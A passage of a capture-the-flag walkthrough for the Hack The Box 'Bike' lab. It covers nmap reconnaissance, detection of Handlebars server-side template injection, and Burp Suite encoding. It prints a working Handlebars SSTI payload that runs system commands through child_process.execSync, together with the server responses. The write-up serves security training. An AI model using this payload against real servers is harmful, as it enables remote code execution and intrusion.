</span></span></code></pre></div><p>We could use the <em><strong>unset</strong></em> command to remove it after we no longer need it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$unset</span> rhost 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><h2 id=task-1><strong>TASK 1</strong><a hidden class=anchor aria-hidden=true href=#task-1>#</a></h2><p><strong>Question</strong>: <em>What TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high.</em></p><p>Starting our <strong>recon</strong> with a quick <strong>connection</strong> <strong>check</strong> is always a good idea.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-gdjzvza4zw<span class=o>]</span>─<span class=o>[</span>~/bike<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ping <span class=nv>$rhost</span> -c <span class=m>4</span>
</span></span><span class=line><span class=cl>PING 10.129.97.64 <span class=o>(</span>10.129.97.64<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.97.64: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>9.73 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.97.64: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>2</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>9.72 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.97.64: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>3</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>9.49 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.97.64: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>4</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>9.56 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.129.97.64 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>4</span> packets transmitted, <span class=m>4</span> received, 0% packet loss, <span class=nb>time</span> 3006ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 9.487/9.621/9.729/0.103 ms
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-gdjzvza4zw<span class=o>]</span>─<span class=o>[</span>~/bike<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><p>Scanning all the <strong>tcp</strong> ports on the <strong>target</strong> tend to be really <strong>slow</strong>, so we <strong>specify</strong> the number of packets we send each second. Hopefully this will <strong>speed</strong> the scans <strong>up</strong> a bit.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-gdjzvza4zw<span class=o>]</span>─<span class=o>[</span>~/bike<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -p- --min-rate <span class=m>5000</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-09 13:12 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.97.64
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>2.7s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>63801</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>, <span class=m>1732</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE
</span></span><span class=line><span class=cl>22/tcp open  ssh
</span></span><span class=line><span class=cl>80/tcp open  http
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 350.85 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-gdjzvza4zw<span class=o>]</span>─<span class=o>[</span>~/bike<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><p>Only <strong>two</strong> ports appear to be <strong>open</strong>: port 22 and port 80.</p><blockquote><p>22,80</p></blockquote><h2 id=task-2><strong>TASK 2</strong><a hidden class=anchor aria-hidden=true href=#task-2>#</a></h2><p><strong>Question</strong>: <em>What software is running the service listening on the http/web port identified in the first question?</em></p><p>Using the <em>-sV</em> option with <em><strong>nmap</strong></em> helps us determine the <strong>service/version</strong> that&rsquo;s running on the specified port.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-gdjzvza4zw<span class=o>]</span>─<span class=o>[</span>~/bike<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -sV -p <span class=m>80</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-09 13:19 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.97.64
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.013s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>80/tcp open  http    Node.js <span class=o>(</span>Express middleware<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 6.79 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-gdjzvza4zw<span class=o>]</span>─<span class=o>[</span>~/bike<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Using our <strong>browser</strong> to check it out, this is how the <strong>website</strong> looks like:</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/bike/website.png alt=Bike-website title=Bike-website></p><blockquote><p>node.js</p></blockquote><h2 id=task-3><strong>TASK 3</strong><a hidden class=anchor aria-hidden=true href=#task-3>#</a></h2><p><strong>Question</strong>: <em>What is the name of the Web Framework according to Wappalyzer?</em></p><p>Using the <em><strong>Wappalyzer</strong></em> <strong>extension</strong> in our browser returns <em>Express</em> for the <strong>Web framework</strong> option.</p><p>On the same note, <strong>fingerprinting</strong> the server with <em><strong>whatweb</strong></em> reveals the same answer.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-gdjzvza4zw<span class=o>]</span>─<span class=o>[</span>~/bike<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ whatweb <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>http://10.129.97.64 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTML5, IP<span class=o>[</span>10.129.97.64<span class=o>]</span>, JQuery<span class=o>[</span>2.2.4<span class=o>]</span>, Script, Title<span class=o>[</span>Bike<span class=o>]</span>, X-Powered-By<span class=o>[</span>Express<span class=o>]</span>, X-UA-Compatible<span class=o>[</span><span class=nv>ie</span><span class=o>=</span>edge<span class=o>]</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-gdjzvza4zw<span class=o>]</span>─<span class=o>[</span>~/bike<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><blockquote><p>express</p></blockquote><h2 id=task-4><strong>TASK 4</strong><a hidden class=anchor aria-hidden=true href=#task-4>#</a></h2><p><strong>Question</strong>: <em>What is the name of the vulnerability we test for by submitting {{7*7}}?</em></p><p><strong>Submitting</strong> - <em>{{7*7}}</em> - into the <em>E-mail</em> field creates an <strong>error message</strong>. Hopefully this means that it is <strong>vulnerable</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/bike/website_seven.png alt=Bike-website-vuln-check title=Bike-website-vuln-check></p><p>Once the <strong>vulnerability</strong> is idenfified, we <strong>read up on it</strong> and once we <strong>understand</strong> it, we try to <strong>exploit</strong> it.</p><blockquote><p>server side template injection</p></blockquote><h2 id=task-5><strong>TASK 5</strong><a hidden class=anchor aria-hidden=true href=#task-5>#</a></h2><p><strong>Question</strong>: <em>What is the templating engine being used within Node.JS?</em></p><p>After taking an other look at the generated <strong>error message</strong> from TASK4, we notice, that there are <strong>multiple mentions</strong> of something called <em>handlebars</em>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>0	&#34;Error: Parse error on line 1:&#34;
</span></span><span class=line><span class=cl>1	&#34;{{7*7}}&#34;
</span></span><span class=line><span class=cl>2	&#34;--^&#34;
</span></span><span class=line><span class=cl>3	&#34;Expecting &#39;ID&#39;, &#39;STRING&#39;, &#39;NUMBER&#39;, &#39;BOOLEAN&#39;, &#39;UNDEFINED&#39;, &#39;NULL&#39;, &#39;DATA&#39;, got &#39;INVALID&#39;&#34;
</span></span><span class=line><span class=cl>4	&#34;    at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)&#34;
</span></span><span class=line><span class=cl>5	&#34;    at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30)&#34;
</span></span><span class=line><span class=cl>6	&#34;    at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)&#34;
</span></span><span class=line><span class=cl>7	&#34;    at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)&#34;
</span></span><span class=line><span class=cl>8	&#34;    at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)&#34;
</span></span><span class=line><span class=cl>9	&#34;    at router.post (/root/Backend/routes/handlers.js:15:18)&#34;
</span></span><span class=line><span class=cl>10	&#34;    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)&#34;
</span></span><span class=line><span class=cl>11	&#34;    at next (/root/Backend/node_modules/express/lib/router/route.js:137:13)&#34;
</span></span><span class=line><span class=cl>12	&#34;    at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3)&#34;
</span></span><span class=line><span class=cl>13	&#34;    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)&#34;
</span></span></code></pre></div><p>Since we already identified the <strong>vulnerability</strong>, it is time to search for ways to <strong>exploit</strong> it. One of the possible <strong>payloads</strong> that we <strong>find</strong> for the <em>handlebar</em> <strong>templating engine</strong> this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=p>{{</span><span class=err>#</span><span class=kd>with</span> <span class=s2>&#34;s&#34;</span> <span class=nx>as</span> <span class=o>|</span><span class=nx>string</span><span class=o>|</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>  <span class=p>{{</span><span class=err>#</span><span class=kd>with</span> <span class=s2>&#34;e&#34;</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>    <span class=p>{{</span><span class=err>#</span><span class=kd>with</span> <span class=nx>split</span> <span class=nx>as</span> <span class=o>|</span><span class=nx>conslist</span><span class=o>|</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>      <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>pop</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>      <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>push</span> <span class=p>(</span><span class=nx>lookup</span> <span class=nx>string</span><span class=p>.</span><span class=nx>sub</span> <span class=s2>&#34;constructor&#34;</span><span class=p>)}}</span>
</span></span><span class=line><span class=cl>      <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>pop</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>      <span class=p>{{</span><span class=err>#</span><span class=kd>with</span> <span class=nx>string</span><span class=p>.</span><span class=nx>split</span> <span class=nx>as</span> <span class=o>|</span><span class=nx>codelist</span><span class=o>|</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>        <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>pop</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>        <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>push</span> <span class=s2>&#34;return require(&#39;child_process&#39;).exec(&#39;whoami&#39;);&#34;</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>        <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>pop</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>        <span class=p>{{</span><span class=err>#</span><span class=nx>each</span> <span class=nx>conslist</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>          <span class=p>{{</span><span class=err>#</span><span class=kd>with</span> <span class=p>(</span><span class=nx>string</span><span class=p>.</span><span class=nx>sub</span><span class=p>.</span><span class=nx>apply</span> <span class=mi>0</span> <span class=nx>codelist</span><span class=p>)}}</span>
</span></span><span class=line><span class=cl>            <span class=p>{{</span><span class=k>this</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>          <span class=p>{{</span><span class=err>/with}}</span>
</span></span><span class=line><span class=cl>        <span class=p>{{</span><span class=err>/each}}</span>
</span></span><span class=line><span class=cl>      <span class=p>{{</span><span class=err>/with}}</span>
</span></span><span class=line><span class=cl>    <span class=p>{{</span><span class=err>/with}}</span>
</span></span><span class=line><span class=cl>  <span class=p>{{</span><span class=err>/with}}</span>
</span></span><span class=line><span class=cl><span class=p>{{</span><span class=err>/with}}</span>
</span></span></code></pre></div><blockquote><p>handlebars</p></blockquote><h2 id=task-6><strong>TASK 6</strong><a hidden class=anchor aria-hidden=true href=#task-6>#</a></h2><p><strong>Question</strong>: <em>What is the name of the BurpSuite tab used to encode text?</em></p><p>It should become quite clear once we take a look around the various tabs available in <em><strong>Burp Suite</strong></em>.</p><blockquote><p>decoder</p></blockquote><h2 id=task-7><strong>TASK 7</strong><a hidden class=anchor aria-hidden=true href=#task-7>#</a></h2><p><strong>Question</strong>: <em>In order to send special characters in our payload in an HTTP request, we&rsquo;ll encode the payload. What type of encoding do we use?</em></p><p>Since this will be a part of a <strong>web request</strong>, <strong>url-encoding</strong> and <strong>formatting</strong> should be enforced. Therefore, we use the <strong>encode as url</strong> option in the <strong>decoder</strong> to encode our <strong>payload</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/bike/burp-decoder.png alt=burp-decoder title=burp-decoder></p><blockquote><p>url</p></blockquote><h2 id=task-8><strong>TASK 8</strong><a hidden class=anchor aria-hidden=true href=#task-8>#</a></h2><p><strong>Question</strong>: <em>When we use a payload from HackTricks to try to run system commands, we get an error back. What is &ldquo;not defined&rdquo; in the response error?</em></p><p>First we need capture the <strong>http request</strong> we send when submitting <em>{{7*7}}</em> into the <em>E-mail</em> field.</p><p>We can do this by launching the <strong>Burp Suite</strong>, turning on the <strong>intercept</strong> in the <strong>Proxy</strong> tab and then enabling the <strong>FoxyProxy</strong> extension in our browser to forward everything to <strong>burp</strong>. Lastly, we make the <strong>same request</strong> in our <strong>browser</strong> as before.</p><p>If everything is configured properly, our <strong>http request</strong> is <strong>intercepted</strong> and shown us in the <strong>Proxy</strong> tab. We send it to the <strong>Repeater</strong> so that we can modify some parts of it.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/bike/burp-repeater-default.png alt=burp-repeater title=burp-repeater></p><p>Then we use the <strong>url-encoded</strong> <strong>payload</strong> from TASK7 so, that once our <strong>payload</strong> is properly <strong>fitted</strong>, we set it for the <em>email</em> <strong>url parameter</strong> in the opened <strong>Repeater</strong> tab.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/bike/burp-repeater-payload-1.png alt=burp-repeater-payload-1 title=burp-repeater-payload-1></p><p>Once set, we <strong>send</strong> the <strong>request</strong>. This is the <strong>response</strong> we get back:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
</span></span><span class=line><span class=cl><span class=n>X-Powered-By</span><span class=o>:</span> <span class=l>Express</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json; charset=utf-8</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>1345</span>
</span></span><span class=line><span class=cl><span class=n>ETag</span><span class=o>:</span> <span class=l>W/&#34;541-sEbhFszxoOHrx2pYd8n5qxybwvM&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Date</span><span class=o>:</span> <span class=l>Tue, 09 May 2023 14:57:17 GMT</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=s2>&#34;ReferenceError: require is not defined&#34;</span><span class=p>,</span><span class=s2>&#34;    at Function.eval (eval at &lt;anonymous&gt; (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23)), &lt;anonymous&gt;:3:1)&#34;</span><span class=p>,</span><span class=s2>&#34;    at Function.&lt;anonymous&gt; (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:10:25)&#34;</span><span class=p>,</span><span class=s2>&#34;    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), &lt;anonymous&gt;:5:37)&#34;</span><span class=p>,</span><span class=s2>&#34;    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)&#34;</span><span class=p>,</span><span class=s2>&#34;    at execIteration (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:51:19)&#34;</span><span class=p>,</span><span class=s2>&#34;    at Array.&lt;anonymous&gt; (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:61:13)&#34;</span><span class=p>,</span><span class=s2>&#34;    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), &lt;anonymous&gt;:12:31)&#34;</span><span class=p>,</span><span class=s2>&#34;    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)&#34;</span><span class=p>,</span><span class=s2>&#34;    at Array.&lt;anonymous&gt; (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:22:14)&#34;</span><span class=p>,</span><span class=s2>&#34;    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), &lt;anonymous&gt;:12:34)&#34;</span><span class=p>]</span>
</span></span></code></pre></div><blockquote><p>require</p></blockquote><h2 id=task-9><strong>TASK 9</strong><a hidden class=anchor aria-hidden=true href=#task-9>#</a></h2><p><strong>Question</strong>: <em>What variable is the name of the top-level scope in Node.JS?</em></p><p>Obviously, our current <strong>payload</strong> does not work since we got an <strong>error</strong> back in TASK8. It is time to start <strong>debugging</strong>, <strong>researching</strong> and <strong>experimenting</strong>.</p><blockquote><p>global</p></blockquote><h2 id=task-10><strong>TASK 10</strong><a hidden class=anchor aria-hidden=true href=#task-10>#</a></h2><p><strong>Question</strong>: <em>By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user?</em></p><p>After an <strong>extensive</strong> <strong>experimenting</strong>, we found a <strong>payload</strong> that <strong>works</strong> as intended:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=p>{{</span><span class=err>#</span><span class=kd>with</span> <span class=s2>&#34;s&#34;</span> <span class=nx>as</span> <span class=o>|</span><span class=nx>string</span><span class=o>|</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>  <span class=p>{{</span><span class=err>#</span><span class=kd>with</span> <span class=s2>&#34;e&#34;</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>    <span class=p>{{</span><span class=err>#</span><span class=kd>with</span> <span class=nx>split</span> <span class=nx>as</span> <span class=o>|</span><span class=nx>conslist</span><span class=o>|</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>      <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>pop</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>      <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>push</span> <span class=p>(</span><span class=nx>lookup</span> <span class=nx>string</span><span class=p>.</span><span class=nx>sub</span> <span class=s2>&#34;constructor&#34;</span><span class=p>)}}</span>
</span></span><span class=line><span class=cl>      <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>pop</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>      <span class=p>{{</span><span class=err>#</span><span class=kd>with</span> <span class=nx>string</span><span class=p>.</span><span class=nx>split</span> <span class=nx>as</span> <span class=o>|</span><span class=nx>codelist</span><span class=o>|</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>        <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>pop</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>        <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>push</span> <span class=s2>&#34;return
</span></span></span><span class=line><span class=cl><span class=s2>process.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;);&#34;</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>        <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>pop</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>        <span class=p>{{</span><span class=err>#</span><span class=nx>each</span> <span class=nx>conslist</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>          <span class=p>{{</span><span class=err>#</span><span class=kd>with</span> <span class=p>(</span><span class=nx>string</span><span class=p>.</span><span class=nx>sub</span><span class=p>.</span><span class=nx>apply</span> <span class=mi>0</span> <span class=nx>codelist</span><span class=p>)}}</span>
</span></span><span class=line><span class=cl>            <span class=p>{{</span><span class=k>this</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>          <span class=p>{{</span><span class=err>/with}}</span>
</span></span><span class=line><span class=cl>        <span class=p>{{</span><span class=err>/each}}</span>
</span></span><span class=line><span class=cl>      <span class=p>{{</span><span class=err>/with}}</span>
</span></span><span class=line><span class=cl>    <span class=p>{{</span><span class=err>/with}}</span>
</span></span><span class=line><span class=cl>  <span class=p>{{</span><span class=err>/with}}</span>
</span></span><span class=line><span class=cl><span class=p>{{</span><span class=err>/with}}</span>
</span></span></code></pre></div><p>So that once we <strong>send</strong> it, this is the <strong>response</strong> we get back:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
</span></span><span class=line><span class=cl><span class=n>X-Powered-By</span><span class=o>:</span> <span class=l>Express</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html; charset=utf-8</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>1226</span>
</span></span><span class=line><span class=cl><span class=n>ETag</span><span class=o>:</span> <span class=l>W/&#34;4ca-gPkNllwoT4EnMNtziaobU75El+k&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Date</span><span class=o>:</span> <span class=l>Tue, 09 May 2023 15:25:15 GMT</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;X-UA-Compatible&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;ie=edge&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>link</span> <span class=na>rel</span><span class=o>=</span><span class=s>&#34;stylesheet&#34;</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;css/home.css&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span> Bike <span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>header</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>header</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>container</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>img</span>
</span></span><span class=line><span class=cl>    <span class=na>src</span><span class=o>=</span><span class=s>&#34;images/buttons.gif&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>id</span><span class=o>=</span><span class=s>&#34;avatar&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;type-wrap&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>span</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;typed&#34;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;white-space:pre;&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;typed&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;contact&#34;</span><span class=p>&gt;</span>
